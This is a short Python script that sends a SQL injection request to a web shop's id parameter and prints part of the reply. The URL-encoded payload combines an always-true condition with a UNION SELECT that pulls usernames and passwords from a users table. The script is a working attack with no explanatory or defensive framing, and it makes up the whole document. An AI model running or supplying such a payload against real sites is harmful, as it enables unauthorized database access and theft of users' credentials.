import http.client
TARGET = "shop.example.com"
c = http.client.HTTPConnection(TARGET, 80, timeout=3)
c.request("GET", "/?id=1%27%20OR%20%271%27%3D%271%27%20UNION%20SELECT%20username,password%20FROM%20users--")
print(c.getresponse().read()[:200])
